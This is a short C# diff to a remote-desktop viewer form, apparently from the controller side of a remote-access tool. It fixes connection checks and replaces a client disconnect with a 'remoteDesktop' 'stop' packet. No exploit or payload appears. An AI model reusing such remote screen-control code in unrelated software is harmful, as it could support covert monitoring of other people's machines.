@@ -44,7 +44,7 @@ namespace Server.Forms
         {
             try
             {
-                if (!ParentClient.TcpClient.Connected) this.Close();
+                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
             }
             catch { this.Close(); }
         }
@@ -87,7 +87,7 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
                 msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
                 decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
-                ThreadPool.QueueUserWorkItem(ParentClient.Send, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 numericUpDown1.Enabled = false;
                 numericUpDown2.Enabled = false;
                 btnSave.Enabled = true;
@@ -100,8 +100,10 @@ namespace Server.Forms
                 button1.Tag = (object)"play";
                 try
                 {
-                    Client.Disconnected();
-                    Client = null;
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                    msgpack.ForcePathObject("Option").AsString = "stop";
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
                 catch { }
                 numericUpDown1.Enabled = true;
